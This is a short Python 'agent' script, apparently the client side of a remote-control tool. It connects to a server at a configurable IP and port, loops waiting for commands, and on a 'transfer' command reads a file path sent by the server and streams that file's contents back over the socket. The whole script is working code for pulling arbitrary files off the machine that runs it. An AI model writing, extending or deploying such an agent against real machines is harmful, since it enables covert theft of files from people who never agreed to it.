# Agent script

import socket,time

SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5151

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))
print("[+] Connected to server")

def transfer(from_):
    from_ = s.recv(1024).decode()
    file = open(from_, 'rb')
    a = file.read(4096)
    while a:
        s.send(a)
        a = file.read(4096)
    time.sleep(0.3)
    s.send(b"\n\r")
    file.close()

while 1:
    command = s.recv(409600).decode()
    print(command)
    command = command.split()

    match command[0]:
        case 'transfer':
            transfer(from_= command[1])



